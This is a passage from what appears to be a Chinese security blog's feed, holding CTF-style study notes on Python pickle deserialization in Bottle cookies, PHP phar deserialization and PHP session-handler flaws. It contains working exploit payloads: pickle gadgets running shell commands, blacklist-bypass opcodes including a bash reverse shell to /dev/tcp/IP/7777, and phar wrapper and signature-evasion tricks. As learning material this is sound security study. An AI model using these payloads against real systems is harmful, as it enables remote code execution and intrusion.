class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle,request,response,run,route<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cmd</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br>c = cmd()<br><span class="hljs-comment"># session = &#123;&quot;name&quot;:c&#125;</span><br>response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>,c,secret=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(response._cookies)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">运行报错：</span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">  File &quot;&quot;, line 7, in &lt;module&gt;</span><br><span class="hljs-string">    response.set_cookie(&quot;name&quot;,c,secret=&quot;secret&quot;)</span><br><span class="hljs-string">  File &quot;E:\python\python3.10.0\lib\site-packages\bottle.py&quot;, line 1869, in set_cookie</span><br><span class="hljs-string">    encoded = base64.b64encode(pickle.dumps([name, value], -1))</span><br><span class="hljs-string">_pickle.PicklingError: second item of the tuple returned by __reduce__ must be a tuple</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 无语了我去，犯弱智了，__reduce__第二个返回的第二个元素（元组形式）后面忘加&#x27;,&#x27;了</span><br></code></pre></td></tr></table></figure></li></ul><h6 id="cookie-encode"><a href="#cookie-encode" class="headerlink" title="cookie_encode()"></a>cookie_encode()</h6><ul><li>除了用<code>set_cookie</code>来间接获取加密后的cookie，还可以使用<code>bottle</code>里专门用来构造<code>cookie</code>的<code>cookie_encode</code>方法<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode<br>secret = <span class="hljs-string">&quot;secret&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cmd</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&gt;test.txt&#x27;)&quot;&quot;&quot;</span>,))<br>c = cmd()<br>exp = cookie_encode((<span class="hljs-string">&#x27;session&#x27;</span>,&#123;<span class="hljs-string">&quot;name&quot;</span>:[c]&#125;),secret)<br><span class="hljs-comment"># exp = cookie_encode((&#x27;name&#x27;,&#123;&quot;name&quot;:[c]&#125;),secret)</span><br><span class="hljs-built_in">print</span>(exp)<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="黑名单R字符与绕过"><a href="#黑名单R字符与绕过" class="headerlink" title="黑名单R字符与绕过"></a>黑名单R字符与绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br><br></code></pre></td></tr></table></figure><ul><li>如果我们构造的<strong>恶意pickle</strong>是利用<code>__reduce__</code>，则payload中会出现R指令，即一个R字符，这就是过滤的逻辑</li><li>可以使用i或者o指令编写的opcode（operration code：操作码）进行绕过<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># R</span><br><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># i</span><br><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># o</span><br><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/7777 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure></li><li><em><strong>值得注意的是</strong></em>：由于我们这里使用的不是<em><strong>R指令</strong></em>，所以我们其实并不是通过调用<code>__reduce__</code>来发起攻击</li><li>更详细分析的见[[0-v0]]</li></ul>]]></content>
    
    
    <categories>
      
      <category>uncategorized</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>HMAC</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2025/10/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/sijidou/p/13121358.html">利用phar协议造成php反序列化 - sijidou - 博客园</a></p><h3 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h3><ul><li>这类似于jar包。在jar包中，一个应用（包括所有的可执行、可访问文件）都被打包进去了</li><li>而PHAR(“Php ARchive”)是PHP中类似JAR的一种打包文件&#x2F;<strong>压缩文件</strong></li><li><em><strong>PHP&gt;&#x3D;5.3</strong></em>的情况下phar后缀文件时<em>默认开启支持</em>的，不需要任何额外安装就能使用</li><li>phar文件在缺省（默认）状态下是只读的，如果要创建phar文件的花话，需要更改一下<code>php.ini</code>的权限设置：<ul><li>将<code>phar.readonly</code>指令行改为<code>phar.readonly=0</code></li><li><em><strong>需要注意的是</strong></em>：<code>ini_set()</code>不能修改该参数，并且要记住<em><strong>该函数不是能修改所有参数</strong></em></li></ul></li><li>与不能在不同数据库之间转换的 PDO 不同，phar 还可以使用一行代码在 tar、zip 和 phar 文件格式之间进行转换。参见 <a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">Phar::convertToExecutable()</a> 中的示例</li></ul><h4 id="反序列化的利用"><a href="#反序列化的利用" class="headerlink" title="反序列化的利用"></a>反序列化的利用</h4><ul><li>利用phar文件会以<strong>序列化的形式</strong>存储用户子弟能够以的<code>meta-data</code>的特性</li><li>通过<code>phar://</code>协议对一个phar文件进行文件操作来触发反序列化<ul><li>因为php大部分文件系统函数通过<code>phar://</code>伪协议来解析<code>phar</code>文件的时候，都会将<code>meta-data</code>进行反序列化，受影响的函数如下所示<br><img src="/../img/2.png"></li></ul></li><li>因为在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了 <code>php_var_unserialize</code>，这使得可以构造一个特殊的phar包，使代码能够被发序列化<ul><li>值得注意的是，<code>__wakeup()</code>等方法不会被调用</li></ul></li><li>在使用<code>phar://</code>协议读取文件时，文件会被解析成phar，解析过程中又会触发<code>php_var_unserialize()</code>函数对<code>meta-data</code>数据的操作，造成反序列化</li></ul><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><ul><li><code>a stub</code>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但<em><strong>必须</strong></em>以<code>__HALT_COMPILER();</code>结尾，否则<strong>phar扩展无法识别该文件为phar文件</strong></li><li><code>a manifest describing the contents</code>：phar文件<em><strong>本质是一种压缩文件</strong></em>，其中每个被压缩的文件的权限、属性等信息都被放在这部分，并且这部分还会<strong>以序列化的形式存储用户自定义的meta-data</strong>，这是攻击的核心</li><li><code>the file contents</code>：被压缩文件的内容</li><li><code>[optional] a signature for verifying Phar integrity(phar file format only)</code>：签名，放在文件末尾</li></ul><h5 id="创建一个phar文件"><a href="#创建一个phar文件" class="headerlink" title="创建一个phar文件"></a>创建一个phar文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>();<br><br><span class="hljs-comment">// unlink():PHP中用来删除一个文件</span><br><span class="hljs-comment">// create new Phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<span class="hljs-comment">// 使用Phar()创建phar文件后缀必须是phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<span class="hljs-comment">// 添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<span class="hljs-comment">// 设置stub</span><br><span class="hljs-comment">// 设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?\&gt; 结尾 </span><br><span class="hljs-comment">//$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?\&gt;&quot;);</span><br><br><span class="hljs-comment">// add object of any class as meta data </span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<span class="hljs-comment">// 即将自定义的meta-data存入manifest</span><br><br><span class="hljs-comment">// 这里会自动计算签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">xxd phar.phar</span><br><span class="hljs-string">00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM</span><br><span class="hljs-string">00000010: 5049 4c45 5228 293b 203f 3e0d 0a49 0000  PILER(); ?&gt;..I..</span><br><span class="hljs-string">00000020: 0001 0000 0011 0000 0001 0000 0000 0013  ................</span><br><span class="hljs-string">00000030: 0000 004f 3a38 3a22 416e 7943 6c61 7373  ...O:8:&quot;AnyClass</span><br><span class="hljs-string">00000040: 223a 303a 7b7d 0800 0000 7465 7374 2e74  &quot;:0:&#123;&#125;....test.t</span><br><span class="hljs-string">00000050: 7874 0400 0000 d1a0 0069 0400 0000 c7a7  xt.......i......</span><br><span class="hljs-string">00000060: 8b3b b601 0000 0000 0000 7465 7874 3317  .;........text3.</span><br><span class="hljs-string">00000070: dbbe 1a77 247c 7570 0a9f 7d60 0b2b 790e  ...w$|up..&#125;`.+y.</span><br><span class="hljs-string">00000080: 5738 0f7d c824 7eaf 2c6c d7ad f9ec 0300  W8.&#125;.$~.,l......</span><br><span class="hljs-string">00000090: 0000 4742 4d42                           ..GBMB</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">// 可以发现其中有反序列化的部分 O:8:&quot;AnyClass&quot;:0:&#123;&#125;，即meta-data是以序列化的形式存储的</span><br><br><span class="hljs-comment">// 进行测试：</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>; &#125; &#125; <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//                            这里是一个解压的过程</span><br><span class="hljs-comment">// 浏览器可以出来，但是IDE不行，应该是没有根目录设置什么的导致的文件索引有问题</span><br><span class="hljs-comment">//// Web服务器的&quot;当前工作目录&quot;是脚本所在的目录，而IDE的可能是项目的根目录，emm貌似都放在项目根目录也不行</span><br></code></pre></td></tr></table></figure><h4 id="phar伪协议对后缀的不在意"><a href="#phar伪协议对后缀的不在意" class="headerlink" title="phar伪协议对后缀的不在意"></a>phar伪协议对后缀的不在意</h4><ul><li>由于phar是一个打包文件，所有只需要<code>phar://</code>检测到的文件是一个正常的打包文件的话就可以了，它并不会去检测文件名和文件内容</li><li>参考博客说压缩要设置<em>仅存储</em>，但根据测试这个并不需要</li><li>所有我们可以将一个内容为<code>&lt;?php phpinfo();?&gt;</code>的<code>test.php</code>压成<code>test.zip</code>，再改后缀成<code>test.jpg</code>，然后用<code>phar://test.jpg/test.php</code>访问</li><li>这利用的是<code>phar</code>协议解析文件的特性</li></ul><h5 id="php解析机制的不同"><a href="#php解析机制的不同" class="headerlink" title="php解析机制的不同"></a>php解析机制的不同</h5><ul><li>不同于<code>phar://</code>的解析机制，php需要通过其文件头的<code>stub</code>，即<code>__HALT_COMPILER();</code>来识别其是<code>phar</code>文件</li><li>不过php的解析也是不在意后缀的</li></ul><p>例题：<a href="https://www.jianshu.com/p/19e3ee990cb7">[hitcon2017] Baby^H-master-php-2017 复现</a><br>PS:匿名函数的真正名字为:%00lambda_%d(%d格式化为当前进程的第n个匿名函数)</p><h4 id="禁止phar开头"><a href="#禁止phar开头" class="headerlink" title="禁止phar开头"></a>禁止phar开头</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">compress.zlib://phar://phar.phar/test.txt<br>compress.bzip://phar:///test.phar/test.txt<br>compress.bzip2://phar://phar.phar/test.txt<br>php://filter/resource=phar:///test.phar/test.txt<br>php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt<br><br></code></pre></td></tr></table></figure><h5 id="HALT-COMPILER特征检测"><a href="#HALT-COMPILER特征检测" class="headerlink" title="__HALT_COMPILER特征检测"></a>__HALT_COMPILER特征检测</h5><ul><li>可以用<code>gzip</code>压缩来消除敏感字符：<code>xxx.phar-&gt;xxx.phar.gz-&gt;xxx.png</code></li><li><code>tar/bzip2</code> 压缩也行<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip xxx.phar<br><br>phar://xxx.phar.gz/xxx.phar<br>phar://xxx.png/xxx.phar<br>              <span class="hljs-comment"># 此处进行解压</span><br></code></pre></td></tr></table></figure></li><li>也可以通过将phar内容写进压缩包注释中，然后压缩为zip</li><li>不过由于zip注释无法写入<code>%00</code>,如果有<code>protected</code>或者<code>private</code>需要将序列化数据s改成S,然后后面通过16进制写入进行绕过<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$phar_file</span>;<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.php.net/manual/zh/book.phar.php">PHP: Phar - Manual</a><br><a href="https://www.freebuf.com/articles/web/291992.html">php phar反序列化总结 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/sijidou/p/13121358.html">利用phar协议造成php反序列化 - sijidou - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>uncategorized</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>phar</tag>
      
      <tag>文件包含</tag>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php的session机制深层解析与利用</title>
    <link href="/2025/10/18/php%E7%9A%84session%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%B1%82%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2025/10/18/php%E7%9A%84session%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%B1%82%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="示例解析"><a href="#示例解析" class="headerlink" title="示例解析"></a>示例解析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// ini_set(&#x27;display_errors&#x27;, 0);// 关闭错误显示</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<span class="hljs-comment">// 使用php序列化引擎</span><br><span class="hljs-comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);// 使用php序列化引擎</span><br><span class="hljs-comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);// 使用php序列化引擎</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<span class="hljs-comment">// 设置程序的默认时区为“亚洲/上海”时区</span><br><span class="hljs-comment">// 自 PHP5.1 起，如果使用任何日期或时间函数，有没有在 php.ini 或代码中指定时区，就会抛出一个 E_WARNING 级别的警告</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yeah&quot;</span>;<br><br><span class="hljs-comment">// 设置 session 不需要像 cookie 一样需要一个set_cookie()</span><br><span class="hljs-comment">// session_start();后会进行下面操作</span><br><span class="hljs-comment">// 当浏览器发送的数据包里没有 PHPSESSID 时，浏览器会创建一个新的会话，并且准备好一个空的$_SESSION数组，然后通过响应包发送一个Set-Cookie: PHPSESSID让浏览器存储会话ID</span><br><br><span class="hljs-comment">// 重要：当访问是携带 PHPSESSID 时，PHP会用这个ID在服务器上寻找对应的会话文件，PHP会读取这个文件里的内容，然后反序列化（根据处理器），并用这些数据填充 $_SESSION 这个超全局数组</span><br><br><span class="hljs-comment">// 会话文件名默认为 sess_PHPSESSID</span><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-comment">// $_COOKIE[&#x27;limit&#x27;] = MQ==</span><br></code></pre></td></tr></table></figure><ul><li>以我的理解和推测的话，从<code>$_SESSION</code>获取值的过程的第一步应该是先根据<strong>会话ID</strong>读取数据然后用<em><strong>相应的处理器反序列化</strong></em>得到结果，中间可能有调用<code>unserialize()</code></li><li><code>$_SESSION</code>存储值的过程的最后一步就是用<em><strong>相应处理器序列化</strong></em>后存储到文件里</li><li>每次读取<code>$_SESSION</code>都经过存储，也就是说都经过一次序列化和反序列化</li></ul><h4 id="序列化处理器"><a href="#序列化处理器" class="headerlink" title="序列化处理器"></a>序列化处理器</h4><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><ul><li>存储：<code>SESSION键名|serialize($_SESSION[&#39;键名&#39;])</code><ul><li><code>limit|s:1:&quot;1&quot;;</code></li></ul></li></ul><h5 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h5><ul><li>存储：应该是<code>serialize()</code>直接序列化<code>$_SESSION[]</code>数组<ul><li><code>a:1:&#123;s:5:&quot;limit&quot;;s:1:&quot;1&quot;;&#125;</code></li></ul></li><li><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong>，在此之前使用<em><strong>php</strong></em><ul><li>怎么感觉是php处理器漏洞太容易利用所以换了</li></ul></li></ul><h5 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h5><ul><li>存储：<code>键名的长度对应的ASCII字符＋键名＋经过serialize()序列化后并处理的值</code><ul><li><code>limits:1:&quot;1&quot;;</code></li></ul></li></ul><h3 id="什么是session反序列化"><a href="#什么是session反序列化" class="headerlink" title="什么是session反序列化"></a>什么是session反序列化</h3><ul><li>PHP在&#x3D;&#x3D;session&#x3D;&#x3D;存储和读取的时候，都会有一个序列化和反序列化的过程，在这个过程中就可能引发反序列化漏洞利用</li><li>&#x3D;&#x3D;php.ini&#x3D;&#x3D;中相关配置，以WampServer为例<ul><li><code>session.save_path</code>：设置session的存储路径</li><li><code>session.save_handler</code>：设定用户自定义存储函数，值为<code>files</code>表示以文件方式存储</li><li><code>session.auto_start</code>：指定会话模块是否在请求时启动一个会话，当值为<code>Off</code>的时候，如果两个脚本注册session会话时使用的序列化处理器不同，就会出现安全问题</li><li><code>session.serialize_handler</code>：定义用来序列化&#x2F;反序列化的<em><strong>处理器</strong></em>名字，默认php，处理默认的<em><strong>session序列化引擎</strong></em>php外，还有几种引擎，不同引擎存储方式不同<ul><li><strong>php_binary</strong>、<strong>php</strong>、<strong>php_serialize</strong></li></ul></li></ul></li></ul><h5 id="序列化处理器不同导致的反序列化漏洞"><a href="#序列化处理器不同导致的反序列化漏洞" class="headerlink" title="序列化处理器不同导致的反序列化漏洞"></a>序列化处理器不同导致的反序列化漏洞</h5><ul><li>其实也相当于<code>php</code>处理器的反序列化漏洞，处理器不同貌似也不影响<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php">demo1.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;test3.php&#x27; &gt;gogogo&lt;/a&gt;&quot;</span>;<br><br>demo2.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br>Class demo &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span 